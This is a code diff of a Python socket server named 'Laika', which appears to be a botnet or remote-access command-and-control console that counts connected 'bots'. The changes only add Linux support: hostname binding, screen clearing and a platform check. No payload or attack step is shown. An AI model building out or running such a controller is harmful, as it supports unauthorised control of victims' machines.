@@ -6,7 +6,7 @@ import os, sys, time
 import select
 import socket
 
-ADRESSE = '192.168.1.35'
+ADRESSE = socket.gethostname()
 PORT = 1337
 CONNECT_CLIENTS = [] #liste des sockets ouverts
 THREAD_LIST = [] #tout les threads
@@ -15,6 +15,10 @@ SELECTED_CLIENT = -1
 
 serveur = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 serveur.bind((ADRESSE, PORT))
+
+def is_linux_user() -> bool :
+    platform = sys.platform
+    return platform == "linux" or platform == "linux2"
 
 def CAESAR(in_s: str) -> str :
     r=""
@@ -35,8 +39,11 @@ def CAESAR_DECRYPT(in_s: str) -> str :
     return r
 
 def ban() :
-    os.system("title Laika - 0 bots")
-    os.system("cls")
+    if is_linux_user() :
+        os.system("clear")
+    else :
+        os.system("title Laika - 0 bots")
+        os.system("cls")
     print(Fore.RED + "   __         _  _          ")
     print(Fore.RED + "  / /   __ _ (_)| | __ __ _ ")
     print(Fore.RED + " / /   / _` || || |/ // _` |")
@@ -72,6 +79,9 @@ def on_close_socket() -> None:
                 pass
 
 def update_title() -> None :
+    if is_linux_user() :
+        return # marche pas encore, nsm linux
+
     while True :
         if SELECTED_CLIENT == -1 :
             os.system("title Laika ^| "+str(len(CONNECT_CLIENTS))+" bots")
